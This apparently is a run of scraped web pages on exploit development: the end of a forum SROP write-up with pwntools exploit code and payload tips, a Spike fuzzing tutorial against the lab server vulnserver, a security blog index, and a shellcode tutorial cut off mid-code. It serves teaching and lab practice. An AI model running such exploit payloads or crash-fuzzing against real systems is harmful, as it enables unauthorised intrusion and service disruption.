FRAME\nframe = SigreturnFrame(kernel=\"amd64\") # CREATING A SIGRETURN FRAME\nframe.rax = 10 # SET RAX TO MPROTECT SYSCALL NUMBER\nframe.rdi = leak # SET RDI TO BUFF ADDRESS\nframe.rsi = 2000 # SET RSI TO SIZE\nframe.rdx = 7 # SET RDX => RWX PERMISSION\nframe.rsp = leak + len(payload) + 248 # WHERE 248 IS SIZE OF FAKE FRAME, CAUSE W\nE STILL NEED TO CONTROL RIP AFTER!\nframe.rip = syscall_ret # SET RIP TO SYSCALL ADDRESS\n# PLACE FAKE FRAME IN STACK\npayload += str(frame)\npayload += p64(leak) # RETURN2SHELLCODE\n# SENDING\nc.sendline(payload)\nc.interactive()\nReference links:\n[15]PDF\n[16]ThisIsSecurity\nChallenge on x86\n* To start your adventure in the SROP world, you should to start\nsimple!\n* The target is, a simple x86 [17]binary!\nProof that it\u2019s working, and exploitable:\n[ad09b64cbc3e86dcc0a04836fb8cc56ed04cd074.png]\n* I made that binary just to help myself understand SROP better, and\nexploit it on my own :smiley: !\n* But now, it\u2019s your turn, to exploit a such binary!\n[828a03814074db9fad4c6a169c2c6d144cc90f50.gif]\n* Good luck. Search much, and learn much! :wink:\n~ exploit\n30 Likes\n[18]M3r8 (M3r8)\nJuly 11, 2017, 7:32pm 2\ndo you like emojis ? :sunglasses:\n2 Likes\n[19]exploit (exploit)\nJuly 11, 2017, 7:33pm 3\nOf course i do! :joy_cat:\n1 Like\n[20]_py\nJuly 11, 2017, 8:07pm 4\nNice write-up [21]@exploit!\nFor those who don\u2019t quite get the theory behind that technique, I\u2019d\nhighly recommend reading the reference links.\nTL;DR - When a signal occurs, the kernel \u201cpauses\u201d the process\u2019s\nexecution in order to jump to a signal handler routine. In order to\nsafely resume the execution after the handler, the context of that\nprocess is pushed\/saved on the stack (registers, flags, instruction\npointer, stack pointer etc). When the handler is finished, sigreturn()\nis being called which will restore the context of the process by\npopping the values off of the stack. That\u2019s what is being exploited in\nthat technique.\n6 Likes\n[22]exploit (exploit)\nJuly 11, 2017, 8:11pm 5\nThank you *_* ! :smiley:\n[23]fraq\nJuly 11, 2017, 8:35pm 6\nI\u2019m gonna have to read this a few more times to fully digest. This is\nsuper good.\n1 Like\n[24]exploit (exploit)\nJuly 11, 2017, 8:41pm 7\nHappy you liked it :smile: !\n[25]_py\nJuly 12, 2017, 11:41am 8\nDone. Thanks for the challenge mate! [26]@exploit requested not to\nrelease the exploit code yet so that more folks can give it a shot.\nYou can find the PoC [27]here.\n1 Like\n[28]exploit (exploit)\nJuly 12, 2017, 11:44am 9\nWell done, and no problem *_*! :smiley:\n[a4770c2019a457c7f313ac07706c71c78e109e62.gif]\n3 Likes\n[29]ricksanchez\nJuly 12, 2017, 3:17pm 10\nawesome article [30]@exploit. I\u2019m on this one with [31]@fraq tho. Need\nto reread it a few times to fully grasp to potential here! :smiley:\n1 Like\n[32]exploit (exploit)\nJuly 12, 2017, 3:23pm 11\nThank you! :laughing:\n[33]febri (Febriyanto Nugroho)\nJuly 13, 2017, 5:31am 12\nawesome article :smiley:\n1 Like\n[34]exploit (exploit)\nJuly 13, 2017, 11:01am 13\n*_* Thank you! :smile:\n[35]zachriggle (Zach Riggle)\nJuly 14, 2017, 3:15am 14\nHey, pwntools developer here!\nHere\u2019s some additional pro tips you may want to integrate into your\nblog\npayload = str(foo)\npayload += pack(bar)\npayload += baz\nCan be collapsed down into a single statement with the flat() function.\npayload = flat(foo, bar, baz)\nIntegers are passed to pack, strings are untouched, and everything else\ngets __pack__() invoked on it.\nAdditionally, it looks like you\u2019re aligning your payload to a specific\nboundary. There is another routine, fit(), which handles this\nautomagically and makes the padding a valid cyclic() offset. This way,\nif you mess up offsets, you will have e.g. \"faab\" instead of \"AAAA\".\npad = cyclic_find(\"faab\")\n# 120\nThe way that this works with fit() would look like:\npayload = fit({\npad: \"BBBB\" # Overwriting saved RIP with BBBB\n})\nfit() just calls flat() on everything passed to it, so you can pass\narrays of things to be set at a given offset.\npayload = fit({\n0: shellcode,          # PLACING SHELLCODE IN BEGINNING OF BUFF\npad: [mov_rax_15_ret,  # SET RAX TO SIGRETURN SYSCALL NUMBER\nsyscall_ret,     # CALL SIGRETURN\nframe,           # PLACE FAKE FRAME ON STACK\nleak]            # RETURN2SHELLCODE\n})\nFor attaching with GDB, you might want to look at the Pwntools function\ngdb.attach() and gdb.debug()!\nFinally, a small nit: You don\u2019t have to specify kernel= for\nSigreturnFrame unless the target arch is i386. Since it\u2019s amd64, this\nis unnecessary.\nThanks for the article, and thanks for using Pwntools!\n14 Likes\n[36]gtx (gtx)\nJuly 14, 2017, 10:43am 15\nExcellent write-up [37]@exploit !\n1 Like\n[38]exploit (exploit)\nJuly 14, 2017, 11:07am 16\n* [39]@zachriggle Thank you so much for your tip! I\u2019ll surely use\nthem in my next write-ups! Thank you for creating pwntools, such an\namazing tool! :smile:\n1 Like\n[40]exploit (exploit)\nJuly 14, 2017, 11:08am 17\n* [41]@gtx Happy you liked it :smile: !\n[42]sloth (Linux Kernel Fetishist)\nNovember 16, 2017, 2:57pm 18\nGreat explanation!\nOne thing i noticed during a walktrough was that with int mprotect(void\n*addr, size_t len, int prot); you need to specify an multiple or the\nstart of an page, otherwise it will not set the permissions correctly.\n(see man mprotect, EINVAL for more\u2026)\nSo to calculate the beginning of a page simple calculate it the\nfollowing way: addr & ~(page_size-1)\nwhere addr is your pointer and page_size is 4096 most of the time.\n2 Likes\n[43]neolex\nNovember 17, 2017, 3:51pm 19\nGreat article, thank you !\nCan you re-upload the binary for the challenge please ?\n1 Like\n[44]sloth (Linux Kernel Fetishist)\nNovember 17, 2017, 4:41pm 20\nJust compile the source code with -m32. The challenge was to use the\nmethod on x86, therefore that should be enough\ngcc source.c -m32 -o binary\n1 Like\n[45]next page \u2192\n* [46]Home\n* [47]Categories\n* [48]FAQ\/Guidelines\n* [49]Terms of Service\n* [50]Privacy Policy\nPowered by [51]Discourse, best viewed with JavaScript enabled"}
{"text":"#[1]hackers-arise - RSS\ntop of page\n(BUTTON) Login\/Sign up\nBUY NOW!\n[2]Return to Home\n(BUTTON)\nLog In\n* [3]All Posts\n____________________\nSearch\n* OTW\n*\n*\n+ Jun 21, 2017\n+\n+ 6 min read\n(BUTTON)\nExploit Development, Part 3: Finding Vulnerabilities by Fuzzing with Spike\nUpdated: Dec 31, 2022\nOften, as part of the exploit development process, we will want to test\nan application for vulnerabilities, especially [4]buffer overflows. One\nof the ways we can do that is to send random, varying length, invalid\ndata at the application and see what happens. If we can get the\napplication to crash, this often is a sign of a vulnerability that we\ncan then develop an exploit for later.\nThe process of sending this random, varying length, invalid data is\nknown as \"fuzzing\". There are numerous fuzzers on the market, some\ngood, some bad, some ineffective and some effective. Just like exploit\ndevelopment, there is an ongoing war between security and hackers and\nthis war includes fuzzers. Once a fuzzer is effective at finding\nvulnerabilities, the software developers adapt and close those types of\nvulnerabilities. Then, the fuzzers must adapt with a new type of data\nto attempt to exploit the vulnerabilities. Fuzzers that are easily\nadaptable and customizable then are highly desirable.\nSpike is a fuzzer that, despite being poorly documented and less than\nintuitive, has proven to be adaptable. In fact, adaptability is Spike's\nstrongest suit. Spike is an API that enables the hacker\/security\nresearcher to quickly develop protocol stress tests. Since many\nprotocols are built around similar data primitives, Spike enables us to\ncreate those primitives and then vary them in ways that will hopefully\ncrash the protocol or application.\nSpike is built into Kali Linux, so there is no need to download any new\napplications or files. Its goals are to make it easy for us to quickly\nand easily reproduce a binary protocol and \"mess\" with it. It also was\ndeveloped to create a base of knowledge about different bug classes\nthat affect similar protocols. Finally, it can also be used to test old\nvulnerabilities in new programs and applications.\nStep #1 Download and Install vulnserver.exe\nIn this lesson, we will use Spike to attempt to crash a vulnerable\nserver to demonstrate its use. We will need our Kali Linux machine, but\nalso a Windows system with vulnserver. You can download and obtain\nvulnerserver at:\nhttp:\/\/sites.google.com\/site\/lupingreycorner\/vulnserver.zip.\nWhen you have downloaded and extracted it, simply click on the\nexecutable vulnserver.exe or type vulnserver.exe in the command prompt.\nWhen you do, it will start vulnserver as shown below. By default,\nvulnserver listens on port 9999, but this can be changed by simply\ntyping the port you want it to listen on after the executable such as;\nc:\\vulnserver.exe 888\nNow that we have the vulnerable server up and running on our Windows\nbox, let's try connecting to it via netcat.\nkali > nc 192.168.181.129 9999\nAs you can see, vulnserver displays its welcome banner and tells us to\ntype HELP if we need help. When we do so, we get a list of commands\nlike in the screenshot below.\nStep #2 Fuzzing with Spike\nSpike enables us write \"scripts\" that can be used to test various\nprotocols and applications. These scripts are referred to as \"Spikes\"\nand these script files are usually appended with a .spk. To find some\nof the ready made Spikes, simply type;\nkali > locate .spk\nThis will locate all the files that end with .spk as seen in the\nscreenshot below.\nThese \"spikes\" are in directories based upon the protocol that they can\nbe used to test. They are in \/usr\/share\/spike\/audits directory. Let's\nnavigate there and take a look.\nAs you can see, there are ready built \"spikes\" to test;\n(1) Compaq\n(2) MS Exchange2k\n(3) Oracle\n(4) Microsoft's SQL Server\n(5) POP3\n(6) SMTP\n(7) FTP\nand many others. Each of these directories contains numerous scripts\nthat we can use to test that particular protocol.\nSince we will be fuzzing a server, we probably want to test or fuzz\nwith TCP based applications. Spike has built in a TCP script\ninterpreter generic_send_tcp and generic_send_udp. Each of these is\ncapable of sending data via that particular protocol to a particular IP\naddress and port. They are located at \/usr\/bin , meaning that we can\nrun them from any directory in Kali as \/usr\/bin is in our PATH\nvariable.\nLet's try typing generic_send_tcp to see whether we can get a help\nscreen.\nkali >generic_send_tcp\nWhen we run it, it comes back with some very basic help on how to use\nit. Notice that we need to follow the command with the target host and\nport, then the spike script and then SKIPVAR and SKIPSTR. So a sample\ncommand might look like this;\nkali > .\/generic_send_tcp 192.168. 1.101 80 somespikescript.spk\nsomevariable somestring\nI think all of the parameters are relatively self-explanatory, except\nthe last two. The SKIPVAR and SKIPSTR allow us to move into the middle\nof a fuzzing session defined by the Spike script. In our case here, we\nwill be using 0 and 0 for these variables as we will be starting each\nscript from the start.\nLet's first try using one of these already built scripts against our\nvulnserver. Let's try using the SMTP scripts against our server and see\nwhether we get it to crash.\nWe can run the SMTP audit against our vulnserver by typing;\nkali > generic_send_tcp 192.168.181.129 9999\nusr\/share\/spike\/audits\/SMTP\/smtp1.spk 0 0\nAs you can see above, this starts Spike sending random sized inputs to\nthe SMTP server testing whether this protocol can maintain operation\nwith these inputs. If we go back to the Windows system running\nvulnserver we can see that it has survived our onslaught of random\ndata!\nAlthough the server has withstood this onslaught, there are many more\nspikes we can throw at it in an attempt to get it to fail. In a real\nworld scenario, we would likely try ALL of these pre-built spikes\nbefore moving on to the next step of building a custom spike script.\nStep #3 Creating our own fuzzing script in Spike\nNow, let's try creating our own Spike script to test the TRUN command\nsupported by our vulnerable server (when we connected to the server via\nnetcat, it had displayed its valid commands after typing HELP). Let's\nopen any text editor to create our script. I will be using Leafpad from\nKali, but you can use any text editor that you feel comfortable with.\nThey will all work.\nWe are creating a short three (3) line script that;\n(1) reads the banner that the server sends;\n(2) simulates that the user put TRUN in a shell as their command; and\n(3) randomizes the user input sent with the TRUN command.\nPlease see the script below with the respective commands to do each of\nthese things. Basically, we are simply reading in the banner from the\nserver, then running the command TRUN with randomized input to test\nwhether we can crash the server with the this unexpected and invalid\ninput.\nAfter completing the Spike script, save it as spiketrunaudit.spk in the\n\/usr\/share\/spike\/audits directory (actually, the name of the file and\nthe directory can be whatever pleases you, but to make your first Spike\nscript easier to do, you are recommended to simply follow my\ninstructions verbatim).\nOnce we completed and saved the script, let's now run it against our\nvulnerable server.\nkali > generic_send_tcp 192.168.181.129 9999\n\/usr\/share\/spike\/audits\/spiketrunaudit.spk 0 0\nWhere:\n192.168.181.129 is the target IP\n9999 is the target port number\n\/usr\/share\/spike\/audit\/spiketrunaudit.spk is the absolute path to our\nscript\n0 is the SPKVAR value\n0 is the SPKSTR value\nWhen hit Enter, Spike will begin to send this data at our vulnerable\nserver as seen below. Eventually, we see the following message\n\"Couldn't tcp connect to target\". Something has obviously gone wrong!\nLet's go back to our Windows 7 system running our vulnerable server. As\nyou can see below, our vulnerable server has stopped running. Our\nfuzzing has crashed the server and that is why we received the message\non Kali that it could no longer connect.\nConclusion\nSpike is framework for creating fuzzing scripts that gives it\nflexibility and adaptability. Some standard fuzzing scripts are\nincluded in the default installation that we can test for known\nvulnerabilities in some common protocols. The real strength of Spike,\nthough, is its ability to generate custom scripts that can be used\nagainst various protocols in order test whether we can get a variable\nto overflow or fail. In this way, we would then have a fundamental clue\nas to the vulnerability of the protocol\/application after which we can\nwork to develop an exploit to use this vulnerability. In another\nlesson, we will examine this vulnerability and try to decipher what it\ntells us about how to construct an exploit for it.\n(BUTTON) (BUTTON) (BUTTON) (BUTTON)\n7,600 views\n(BUTTON) 5 likes. Post not marked as liked5\nRecent Posts\n[5]See All\n[6]DDoS Attacks: Flooding Russian Sites with Fragmented UDP Packets\n5,527\n(BUTTON) 88 likes. Post not marked as liked88\n[7]Hackers-Arise Announces a New Training Program: Digital Forensics\nand Incident Response (DFIR)!\n3,689\n(BUTTON) 58 likes. Post not marked as liked58\n[8]Getting Started with PGP for email\n1,994\n(BUTTON) 34 likes. Post not marked as liked34\n* [9]Welcome\n+ [10]About\n+ [11]Who Is Master OTW?\n* [12]FAQ\n* [13]GETTING STARTED\n* [14]SCADA Hacking\n* [15]Online Courses\n+ [16]Web App Hacking Course\n+ [17]Security+\n+ [18]Linux Firewalls\n+ [19]Advanced Linux\n+ [20]OSINT Course\n+ [21]Network Basics for Hackers\n+ [22]Scripting for Hackers\n+ [23]Advanced SCADA Hacking and Security\n+ [24]Automobile Hacking\n+ [25]Linux Basics for Hackers\n+ [26]CISSP Prep\n+ [27]Introduction to Snort (IDS)\n+ [28]Cyber Warrior Training\n+ [29]Metasploit Basics for Hackers\n+ [30]CWA Prep Course\n+ [31]SCADA\/ICS Security\n+ [32]Digital Forensics\n+ [33]Wi-Fi Hacking\n+ [34]Mobile Hacking\n+ [35]Reverse Engineering Malware\n+ [36]Network Forensics\n* [37]Course Registration\n* [38]Online Store\n* [39]Training Packages\n+ [40]MEMBERS\n+ [41]Subscribers\n+ [42]Subscriber PRO\n* [43]Training Schedule\n* [44]OTW's New Book\n+ [45]Praise for Linux Basics\n+ [46]OTW's Book Shipping US\n+ [47]OTW's Book Shipping Outside US\n* [48]OTW on Youtube\n* [49]Blog\n* [50]Confessions of a Pro Hacker\n+ [51]How Russian Hackers Compromised Election\n+ [52]How Hackers Obtained the Panama Papers\n+ [53]EternalBlue\n* [54]Hackers For Hire\n+ [55]Hackers for Hire Request\n+ [56]Hackers Needed\n* [57]How to Become a Hacker\n+ [58]What it Takes to Become a Hacker\n+ [59]Why Hacking is the Most Valuable Skills\n+ [60]Essential Skills of a Master Hacker\n* [61]Hacking Fundamentals\n* [62]Linux for Hackers\n+ [63]Why Every Hacker Should Know and Use Lin\n+ [64]Why Every Hacker Should Know and Use Lin\n+ [65]Part 1, Getting Started\n+ [66]Part 2, Finding Stuff\n+ [67]Part 3, Creating, Removing and Renaming\n+ [68]Part 4, Networking\n+ [69]Part 5, Adding and Removing Software\n+ [70]Part 6, Managing Permssions\n+ [71]Part 7, BASH Basics\n+ [72]Part 8, Managing the User Environment\n+ [73]Part 9, Text manipulation\n+ [74]Part 10, Loadable Kernel Modules\n* [75]Networks Basics for Hackers\n* [76]Wireless Hacks\n+ [77]Getting Started with aircrack-ng\n+ [78]Cracking the WPS PIN with Reaver\n+ [79]Cracking WPA2-PSK with aircrack-ng\n+ [80]Evading Wireless Authentication\n+ [81]Continuous DoSing a Wireless AP\n+ [82]Wi-Fi Hacking without Cracking Passwords\n* [83]Mr. Robot\n+ [84]Mr. Robot Hacks: Elliot Builds a Hacking\n+ [85]How Elliot Covered his Tracks\n+ [86]Mr. Robot Hacks: Hiding Data in Audio Fi\n+ [87]How Elliot Traces the Dark Army\n+ [88]How f\/society Hacked Smarthome\n+ [89]How Elliot Hacked the Prison\n+ [90]How Angela Stole Boss's Password\n+ [91]How f\/society Ransomed Evil Corp\n+ [92]How Elliot Created a Hacking Raspberry P\n* [93]Hack Like the NSA\n+ [94]The Quantum Insert\n+ [95]EXTRABACON of Cisco Firewalls\n+ [96]Shadow Brokers Exploits\n* [97]OSINT\n+ [98]OSINT:Case Studies\n* [99]Metasploit\n+ [100]Part 1, Getting Started with Metasploit\n+ [101]Part 2, Metasploit Modules\n+ [102]Part 3, Metasploit Payloads\n+ [103]Part 4, Connecting postgresql\n+ [104]Part 5: Recon with Metasploit\n+ [105]Part 6: Armitage\n+ [106]Part 7, Adding a Module\n+ [107]Part 8, Exploitation with EternalBlue\n+ [108]Part 9, msfvenom for Custom Payloads\n+ [109]Part 10: Pivoting to Control the Network\n+ [110]Part 11: Exploiting MS Office Fileformat\n+ [111]Part 12: Creating RC Scripts\n+ [112]Part 13: Exploiting Android Devices\n+ [113]Part 14: Updating the msfconsole\n+ [114]Part 15: Post-Exploitation Fun!\n+ [115]Part 16: SCADA Hacking with Metasploit\n+ [116]Part 17: Automobile Hacking\n+ [117]Part 18: AutoSploit\n+ [118]Part 19: Web Delivery for Windows\n+ [119]Part 20: Creating a Fake SMB Server\n+ [120]Part 21: mimikatz\n+ [121]Part 22: Owning with Physical Access\n+ [122]Part 23: Remote Forensics\n+ [123]Part 24: Evasion Modules\n+ [124]Part 25: Web Delivery Linux\/Unix\n+ [125]Car Hacking with Metasploit\n+ [126]Create a Fake SMB Server with Metasploi\n+ [127]SCADA\/ICS Metasploit Modules\n+ [128]Metasploit Basics\n+ [129]msfvenom\n+ [130]Metasploit's autopwn\n+ [131]Using Metasploit's psexec\n+ [132]Metasploit Web Delivery for Windows\n+ [133]How to Make the Meterpreter Persistent\n+ [134]Ultimate List of Meterpreter scripts\n+ [135]Ultimate List of Meterpreter Command\n+ [136]Web Delivery for Linux\/UNIX\n+ [137]Mimikatz\n+ [138]Metasploit Resource Scripts\n+ [139]Metsploit Keywords and Commands\n* [140]Hack to Spy\n+ [141]Part 1: Building a Raspberry Spy Pi\n+ [142]Part 2, Building a Raspberry Spy Pi\n+ [143]Part 3: Building a Raspberry Spy Pi\n+ [144]Part 4: Adding Listening Capability\n+ [145]Spy on Anyone's Smartphone\n+ [146]Listen to Anyone's Conversation\n+ [147]How to Catch a Terrorist\n+ [148]How to Hack Web cams\n* [149]WebApp Hacking\n+ [150]Part 5:Enumerating Usernames & Passwords\n+ [151]Part 6: Brute Force WP using XMLRPC\n+ [152]Part 7: Creating a Backdoor with weevely\n+ [153]Part 8: Cloning a Web Site\n+ [154]Part 9: XSS\n+ [155]Part 10: Directory or Path Traversal\n+ [156]Part 11: Local File Inclusion (LFI)\n+ [157]Part 12: CSRF\n+ [158]Part 13, Comprehensive Recon with TiDOS\n+ [159]Part 14: OS Command Injection\n+ [160]Part 15: Fingerprinting with whatweb\n+ [161]Finding Hidden Directories with dirb\n+ [162]Web Technologies, Part 1\n+ [163]Overview and Strategy for Beginners\n+ [164]Spidering a Website with Scarab\n+ [165]Finding Vulnerable WordPress Sites\n+ [166]Finding Vulnerabilities in WordPress\n+ [167]Finding Web Vulnerabilities: Wikto\n+ [168]Hacking Form Authentication with Burp Su\n+ [169]Getting Started with OWASP-ZAP\n* [170]Digital Forensics Program\n* [171]Digital Forensics\n+ [172]Forensic Investigator for Hire\n+ [173]Network Forensics\n+ [174]Part 1, Capturing the Image\n+ [175]Part 2, Live Memory Acquisition\n+ [176]Part 3, Recovering Deleted Files\n+ [177]Part 4, Finding key Evidence\n+ [178]Part 5, Analyzing the Registry\n+ [179]Part 6: Pre-Fetch Files\n+ [180]Part 7: Browser Forensics\n+ [181]Part 8: Live Analysis with Sysinternals\n+ [182]Part 9: Extracting EXIF from Graphics\n+ [183]Network Forensics\n+ [184]Wireshark Basics\n+ [185]Part 1: Analyzing an Intrusion\n+ [186]Part 2: Analyzing a SCADA Attack\n+ [187]Part 3: Packet Analysis EternalBlue\n* [188]Anti-Forensics\n+ [189]How Elliot Covered his Tracks: shred\n+ [190]BASH Shell Anti-Forensics\n+ [191]Removing Evidence with BleachBit\n* [192]Automobile Hacking\n+ [193]Hacking the Mitsubishi Outlander\n+ [194]Part 1, The CAN Protocol\n+ [195]Part 2, can-utils for Linux\n+ [196]Part 3: Car Hacking with Metasploit\n+ [197]Part 4: Hacking the Key Fob\n+ [198]Part 5: Hacking the Remote Alarm\n+ [199]Part 6: Installing the ICS Simulator\n* [200]Confidantes\n* [201]Evading AV\n+ [202]Evading AV with OWASP-ZSC\n+ [203]Anatomy of ClamAV\n+ [204]Evading AV with Veil-Evasion\n* [205]DataBase Hacking\n+ [206]Part 1: Getting Started\n+ [207]Part 2: Basics of SQL Injection\n+ [208]Part 3, Using sqlmap against MySQL\n+ [209]Part 4, Extracting Data with sqlmap\n* [210]Password Cracking\n+ [211]Scraping Potential Passwords with CeWL\n+ [212]Password Cracking Strategy\n+ [213]Online Password Cracking\n+ [214]Online Password Cracking with Hydra\n+ [215]Cracking Passwords with hashcat\n+ [216]Cracking Passwords with hashcat\n+ [217]password-lists\n* [218]HoneyPot\n* [219]PowerSploit\n* [220]Reconnaissance\n+ [221]Operating System Fingerprinting with p0F\n+ [222]Recon with unicornscan\n+ [223]How to Use Maltego, Part 1\n+ [224]Maltego, Part 2: Recon on a Person\n+ [225]Google Hacking\n+ [226]Email Scraping and Maltego\n+ [227]Finding Website Vulnerabilities with Nik\n+ [228]Abusing DNS for Recon\n+ [229]nmap for recon and DoS\n+ [230]hping for Reconnaissance\n* [231]Hacking Bluetooth\n+ [232]Part 2, Blutooth Recon\n+ [233]Part 3, The Bluebourne Exploit\n* [234]Hacking Facebook\n+ [235]Getting Facebook Credentials without Hac\n+ [236]Facebook Password Extractor\n* [237]Exploit Development\n+ [238]Part 1, Anatomy of Buffer Overflow\n+ [239]Part 2, Writing a Simple Buffer Overflow\n+ [240]Part 3, Fuzzing with Spike\n* [241]Reverse Engineering Malware\n+ [242]Anatomy of Ransomware\n+ [243]Part 1, Reverse Engineering Malware\n+ [244]Part 2, Assembler Basics\n+ [245]Part 3, Intro to IDA Pro\n+ [246]Part 4, Windows Internals\n+ [247]Part 5, OllyDbg Basics\n+ [248]Why Study Reverse Engineering\n* [249]Vulnerability Scanning\n+ [250]Vulnerability Scanning with Nexpose\n* [251]Snort\n+ [252]Snort, Part1: Installing Snort\n+ [253]Snort, Part 2: Configuration\n+ [254]Snort, Part 3: Sending Alerts to MySQL\n+ [255]Snort, Part 4: Snort Rules\n+ [256]Snort, Part 5: Testing Known Exploits\n* [257]Android Hacking\n+ [258]Setting Up an Android Hacking Lab\n+ [259]Android Basics\n+ [260]Android Hacking: BlueBoune Exploit\n+ [261]Embedding a Backdoor\n* [262]Shodan\n* [263]Scripting for Hackers\n+ [264]Powershell for Hackers,Part 1\n+ [265]Perl, Part 1:Intro\n+ [266]Perl, Part 2: Port Scanner\n+ [267]BASH Scripting\n+ [268]Python 2: Building a Banner Grabber\n+ [269]Python 3: Building a FTP Password Crack\n* [270]MiTM\n+ [271]Hacking DNS to Re-Direct on your LAN\n+ [272]MitM with Ettercap\n+ [273]MitM with arpspoof\n+ [274]Viewing Graphic Files with driftnet\n* [275]OTW Recommended Products\n+ [276]Cyber Law\n* [277]SDR for Hackers\n* [278]Python Basics for Hackers\n+ [279]Python 1: Getting Started\n* [280]SDR for Hackers\n* [281]Ransomware\n* [282]Linux Firewalls\n* [283]Advertising with Hackers-Arise\n* [284]Job Board\n* [285]Podcast by OTW\n* [286]Forum\n* [287]Members\n* [288]Mobile or Cellular Hacking\npentester.png\nbottom of page"}
{"text":"#[1]RSS [2]Medium [3]alternate\n[4]Homepage\n[5]Open in app\n[6]Sign in[7]Get started\n[1*3uVQZ2jq9Y4cb5K6hsTmHg@2x.png]\n[8]\nIFCR\nInstitut For Cyber Risk\n[9]About\n[10]IFCR\n____________________ (BUTTON) FollowFollowing\nLatest Research\n[11]Pass-the-Challenge: Defeating Windows Defender Credential Guard[12]\nPass-the-Challenge: Defeating Windows Defender Credential Guard\nIn this blog post, we present new techniques for recovering the NTLM\nhash from an encrypted credential protected by Windows Defender\u2026\n[13]Go to the profile of Oliver Lyak\n[14]Oliver Lyak\nDec 26, 2022\n[15]Certipy 4.0: ESC9 & ESC10, BloodHound GUI, New Authentication and\nRequest Methods\u200a\u2014\u200aand more![16]\nCertipy 4.0: ESC9 & ESC10, BloodHound GUI, New Authentication and\nRequest Methods\u200a\u2014\u200aand more!\nA new version of Certipy has been released along with a forked\nBloodHound GUI that has PKI support! In this blog post, we will\nlook at\u2026\n[17]Go to the profile of Oliver Lyak\n[18]Oliver Lyak\nAug 4, 2022\n[19]Certifried: Active Directory Domain Privilege Escalation\n(CVE-2022\u201326923)[20]\nCertifried: Active Directory Domain Privilege Escalation\n(CVE-2022\u201326923)\nIn this blog post, we\u2019ll dive into a recently patched Active Directory\nDomain Privilege Escalation vulnerability that I reported through\u2026\n[21]Go to the profile of Oliver Lyak\n[22]Oliver Lyak\nMay 10, 2022\n[23]Certipy 2.0: BloodHound, New Escalations, Shadow Credentials,\nGolden Certificates, and more![24]\nCertipy 2.0: BloodHound, New Escalations, Shadow Credentials, Golden\nCertificates, and more!\nAs the title states, the latest release of Certipy contains many new\nfeatures, techniques and improvements. This blog post dives into the\u2026\n[25]Go to the profile of Oliver Lyak\n[26]Oliver Lyak\nFeb 19, 2022\n[27]SpoolFool: Windows Print Spooler Privilege Escalation\n(CVE-2022-21999)[28]\nSpoolFool: Windows Print Spooler Privilege Escalation (CVE-2022-21999)\nIn this blog post, we\u2019ll look at a Windows Print Spooler local\nprivilege escalation vulnerability that I found and\u2026\n[29]Go to the profile of Oliver Lyak\n[30]Oliver Lyak\nFeb 8, 2022\n[31]\nFirst!\nToday we are launching the IFCR research blog. The ambition is to\nprovide original research and new technical ideas and approaches\nto the\u2026\n[32]Go to the profile of Michael Dyrmose\n[33]Michael Dyrmose\nFeb 8, 2022\n[34]About IFCR[35]Latest Stories[36]Archive[37]About\nMedium[38]Terms[39]Privacy[40]Teams"}
{"text":"#[1]Adventures in the programming jungle \u00bb Feed [2]Adventures in the\nprogramming jungle \u00bb Comments Feed [3]alternate [4]alternate\n[5]Adventures in the programming jungle [6]WordPress.com\n[7]Skip to content\n(BUTTON) Primary Menu\n* [8]Home\n* [9]About\n(BUTTON) Search\nSearch for: ____________________ Search\n[10]Adventures in the programming jungle\nAdrian Citu's Technical Blog\n[11]Introduction to Linux shellcode writing (Part 1)\n[12]31 August, 201525 August, 2015[13]Adrian Citu\nIntroduction\nThis is very brief and basic list of steps to follow if you want to\nwrite a shellcode under Linux operating system.\n1. Craft the shellcode\nThe first step and by far the most important one is to find a\nvulnerability and to write the shellcode that\u2019s exploiting\nthe vulnerability. In this tutorial we will write a dummy shellcode\nrepresented by the \u201cHello World\u201d program. The easiest way to write a\nshellcode is first to write it in the C language and then in order to\nhave a more compact version, to translate it or to rewrite the\nshellcode in assembler.\n1.1 Craft the shellcode in C\nThe main goal of writing the shellode in C is to have first working\nversion of the exploit without (yet) bothering about the constraints of\nthe shellcode execution (see later the chapter about the validity of\nthe shelcode). In our case, the C version of our dummy shellcode is the\nfollowing one:\n#include<stdio.h>\nint main(){\nwrite(1,\"Hello World \\n\", 14);\nreturn 0;\n}\nAfter the compilation (gcc -o hello hello.c) we can take a look at the\ngenerated assembly code (objdump -d .\/hello -M intel) and we would see\nthat for a very small C program the assembly version is quite long\n(this is mainly due to the C preprocessor); it\u2019s 228 lines length\n( objdump -d .\/hello -M intel | wc -l).\nNow, we would like to \u201ctranslate\u201d the C version of our shellcode in the\nassembly version and the most straightforward way is by finding the\nsystem calls that hat are made by the C version of the shellcode. In\nsome cases the system calls are quite obvious (the case of the write\nfunction) but sometimes it\u2019s not so easy to guess. The tool that will\ngive to you the system calls is the strace. In our case the strace\n.\/hello will have the following output (the parts that are interesting\nfor us are in bold):\nexecve(\".\/hello\", [\".\/hello\"], [\/* 62 vars *\/]) = 0\nbrk(0)                                  = 0x8826000\naccess(\"\/etc\/ld.so.nohwcap\", F_OK)      = -1 ENOENT (No such file or directory)\nmmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7\n6fa000\n....\n....\nmprotect(0xb771d000, 4096, PROT_READ)   = 0\nmunmap(0xb76dd000, 117407)              = 0\nwrite(1, \"Hello World \\n\\0\", 14Hello World\n)        = 14\nexit_group(0)                           = ?\n1.2 Craft the shellcode in assembler\nNow that we have the system calls it is possible to get some infos like\nthe parameters needed by the each system call (using man) and the\nsystem calls numbers (all the system calls names and number are in\n\/usr\/include\/i386-linux-gnu\/asm\/unistd_32.h file).\nSo, the number of the write call is 4 (using cat\n\/usr\/include\/i386-linux-gnu\/asm\/unistd_32.h | grep write) and the\nparameters are the following one (using man 2 write):\nssize_t write(int fd, const void *buf, size_t count);\nFor the exit system call the number is 1 and the call parameter are :\nvoid _exit(int status);\nHaving all the needed information, we can write the assembler version\nof our dummy shellcode.\nIn order to call system calls in assembler, you must fill\nthe tax register with the system call number and fill the register ebx,\necx, edx for every parameter that the system call need.\nFor example the write have 3 parameters so the tax register will be\nfilled with 0x4 (the system call number), ebx register will contain the\nfile descriptor (1 for sysout), ecx register will contains the address\nof the string to print, and edx register will contain the length of the\nstring to print (if you don\u2019t have any knowledge of linux assembler you\ncan take a look to this very good introduction [14]Assembly Language\nand Shellcoding on Linux ):\nglobal _start\nsection .text\n_start:\n;execute write(1,\"Hello World \\n\", 14);\nmov eax, 0x4\nmov ebx, 0x1\nmov ecx, message\nmov edx, 0xD\nint 0x80\n;execute _exit(0);\nmov eax, 0x1\nmov ebx, 0x5\nint 0x80\nsection 